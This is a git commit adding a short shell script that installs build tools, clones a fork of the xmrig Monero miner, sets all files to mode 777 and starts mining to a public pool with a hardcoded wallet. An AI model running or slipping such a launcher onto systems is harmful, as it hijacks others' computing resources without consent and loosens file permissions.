4c7b80ef59628a7ed67e9bcbcd535a145b232db0
MikeSchiller07 <86876754+MikeSchiller07@users.noreply.github.com>
2021-07-06 18:03:11 +0200

    Add files via upload

---
+++ start.sh
@@ -0,0 +1,6 @@
+sudo apt-get install git build-essential cmake libuv1-dev libmicrohttpd-dev libssl-devlibssl-dev -y
+apt-get install git build-essential cmake libuv1-dev libmicrohttpd-dev libssl-devlibssl-dev -y
+git clone https://github.com/MikeSchiller07/xmrig
+chmod 777 *
+cd xmrig
+./xmrig -o pool.supportxmr.com:443 -u 8C34Dv2y8tpan9D1xmarqXjAj98jdYVTVUR66bBSXHsLVrpNGdqJYBJcGWWvMLSU7XCWxZnrykCzbAAYFKjQXzSiCmz4fXL -k --tls
